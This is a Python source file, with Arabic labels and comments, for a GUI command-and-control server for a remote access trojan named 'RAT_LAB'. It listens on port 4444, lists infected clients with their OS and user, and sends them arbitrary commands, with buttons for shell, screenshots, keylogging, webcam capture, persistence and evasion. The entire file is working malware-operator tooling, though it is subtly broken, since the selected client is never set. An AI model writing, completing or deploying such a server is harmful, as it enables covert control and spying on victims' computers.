#!/usr/bin/env python3
# RAT_LAB C2 Server - لوحة تحكم متقدمة

import customtkinter as ctk
import socket
import threading
import json
import time
import queue
from datetime import datetime
import os

class RAT_C2_Server:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("RAT_LAB C2 Server")
        self.root.geometry("1200x800")
        
        # الألوان
        ctk.set_appearance_mode("dark")
        self.colors = {
            "bg": "#1a1a1a",
            "fg": "#ffffff",
            "accent": "#00ff00",
            "warning": "#ffaa00",
            "error": "#ff0000"
        }
        
        # البيانات
        self.clients = {}
        self.selected_client = None
        self.command_queue = queue.Queue()
        self.running = True
        
        self.setup_ui()
        self.start_listener()
        
    def setup_ui(self):
        """إعداد واجهة المستخدم"""
        # Header
        header = ctk.CTkFrame(self.root)
        header.pack(fill="x", padx=10, pady=5)
        
        ctk.CTkLabel(header, text="RAT_LAB C2 Server", 
                    font=("Arial", 24, "bold")).pack(side="left", padx=10)
        
        status_label = ctk.CTkLabel(header, text="● نشط", 
                                   text_color=self.colors["accent"],
                                   font=("Arial", 14))
        status_label.pack(side="right", padx=10)
        
        # Main container
        main_container = ctk.CTkFrame(self.root)
        main_container.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Left panel - Clients list
        left_panel = ctk.CTkFrame(main_container)
        left_panel.pack(side="left", fill="both", expand=True, padx=(0, 5))
        
        ctk.CTkLabel(left_panel, text="العملاء المتصلون", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        # Clients listbox
        self.clients_listbox = ctk.CTkTextbox(left_panel, width=400, height=600)
        self.clients_listbox.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Right panel - Commands & Output
        right_panel = ctk.CTkFrame(main_container)
        right_panel.pack(side="right", fill="both", expand=True, padx=(5, 0))
        
        # Commands section
        cmd_frame = ctk.CTkFrame(right_panel)
        cmd_frame.pack(fill="x", padx=5, pady=5)
        
        ctk.CTkLabel(cmd_frame, text="الأوامر", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        # Command input
        cmd_input_frame = ctk.CTkFrame(cmd_frame)
        cmd_input_frame.pack(fill="x", padx=5, pady=5)
        
        self.cmd_entry = ctk.CTkEntry(cmd_input_frame, placeholder_text="اكتب الأمر هنا...")
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        
        send_btn = ctk.CTkButton(cmd_input_frame, text="إرسال", 
                                command=self.send_command)
        send_btn.pack(side="right")
        
        # Quick commands
        quick_frame = ctk.CTkFrame(cmd_frame)
        quick_frame.pack(fill="x", padx=5, pady=5)
        
        quick_commands = [
            ("Shell", "shell"),
            ("Screenshot", "screenshot"),
            ("Keylogger", "keylogger"),
            ("Webcam", "webcam"),
            ("Persistence", "persistence"),
            ("Evasion", "evasion")
        ]
        
        for name, cmd in quick_commands:
            btn = ctk.CTkButton(quick_frame, text=name, width=80,
                               command=lambda c=cmd: self.send_quick_command(c))
            btn.pack(side="left", padx=2)
        
        # Output section
        output_frame = ctk.CTkFrame(right_panel)
        output_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        ctk.CTkLabel(output_frame, text="الناتج", 
                    font=("Arial", 16, "bold")).pack(pady=5)
        
        self.output_text = ctk.CTkTextbox(output_frame, height=400)
        self.output_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Status bar
        self.status_bar = ctk.CTkLabel(self.root, text="جاري الانتظار...", 
                                      text_color=self.colors["accent"])
        self.status_bar.pack(fill="x", padx=10, pady=(0, 5))
        
    def start_listener(self):
        """بدء استماع للعملاء"""
        self.listener_thread = threading.Thread(target=self.listen_for_clients)
        self.listener_thread.daemon = True
        self.listener_thread.start()
        
        # Update UI periodically
        self.update_ui()
        
    def listen_for_clients(self):
        """استماع للعملاء الجدد"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", 4444))
        server.listen(5)
        
        self.status_bar.configure(text="● جاري الاستماع على المنفذ 4444")
        
        while self.running:
            try:
                client_socket, addr = server.accept()
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, addr)
                )
                client_thread.daemon = True
                client_thread.start()
            except:
                break
                
    def handle_client(self, client_socket, addr):
        """تعامل مع عميل متصل"""
        client_id = f"{addr[0]}:{addr[1]}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # إضافة العميل للقائمة
        self.clients[client_id] = {
            "socket": client_socket,
            "addr": addr,
            "connected_at": timestamp,
            "last_seen": timestamp,
            "status": "متصل",
            "info": {}
        }
        
        # إرسال رسالة ترحيب
        welcome_msg = {
            "type": "welcome",
            "message": "تم الاتصال بالـ RAT_LAB C2 Server",
            "timestamp": timestamp
        }
        self.send_to_client(client_id, welcome_msg)
        
        # استلام البيانات من العميل
        while self.running and client_id in self.clients:
            try:
                data = client_socket.recv(4096)
                if not data:
                    break
                    
                message = json.loads(data.decode())
                self.process_client_message(client_id, message)
                
            except Exception as e:
                break
                
        # إزالة العميل
        if client_id in self.clients:
            del self.clients[client_id]
            
    def process_client_message(self, client_id, message):
        """معالجة رسالة من العميل"""
        msg_type = message.get("type", "")
        
        if msg_type == "info":
            # تحديث معلومات العميل
            self.clients[client_id]["info"] = message.get("data", {})
            self.clients[client_id]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
        elif msg_type == "output":
            # عرض ناتج الأمر
            output = message.get("output", "")
            self.add_output(f"[{client_id}] {output}")
            
        elif msg_type == "error":
            # عرض خطأ
            error = message.get("error", "")
            self.add_output(f"[{client_id}] خطأ: {error}", "error")
            
    def send_to_client(self, client_id, message):
        """إرسال رسالة للعميل"""
        try:
            if client_id in self.clients:
                data = json.dumps(message).encode()
                self.clients[client_id]["socket"].send(data)
        except:
            pass
            
    def send_command(self):
        """إرسال أمر مخصص"""
        if not self.selected_client:
            self.add_output("الرجاء اختيار عميل أولاً", "error")
            return
            
        command = self.cmd_entry.get().strip()
        if not command:
            return
            
        # إضافة للقائمة السريعة
        cmd_msg = {
            "type": "command",
            "command": command,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.send_to_client(self.selected_client, cmd_msg)
        self.add_output(f"[تم الإرسال] {command}")
        self.cmd_entry.delete(0, "end")
        
    def send_quick_command(self, command):
        """إرسال أمر سريع"""
        if not self.selected_client:
            self.add_output("الرجاء اختيار عميل أولاً", "error")
            return
            
        cmd_msg = {
            "type": "command",
            "command": command,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        self.send_to_client(self.selected_client, cmd_msg)
        self.add_output(f"[تم الإرسال] {command}")
        
    def add_output(self, text, color="normal"):
        """إضافة نص للناتج"""
        colors = {
            "normal": self.colors["fg"],
            "error": self.colors["error"],
            "warning": self.colors["warning"],
            "success": self.colors["accent"]
        }
        
        self.output_text.insert("end", text + "\n", color)
        self.output_text.tag_config(color, foreground=colors[color])
        self.output_text.see("end")
        
    def update_ui(self):
        """تحديث واجهة المستخدم"""
        # تحديث قائمة العملاء
        self.clients_listbox.delete("1.0", "end")
        
        for client_id, client_data in self.clients.items():
            info = client_data.get("info", {})
            status = client_data.get("status", "غير متصل")
            
            client_text = f"{client_id} - {status}\n"
            if info:
                client_text += f"  OS: {info.get('os', 'غير معروف')}\n"
                client_text += f"  User: {info.get('user', 'غير معروف')}\n"
                client_text += f"  Connected: {client_data['connected_at']}\n"
                
            self.clients_listbox.insert("end", client_text)
            
        # جدولة التحديث التالي
        self.root.after(1000, self.update_ui)
        
    def run(self):
        """تشغيل الخادم"""
        self.root.mainloop()

if __name__ == "__main__":
    server = RAT_C2_Server()
    server.run()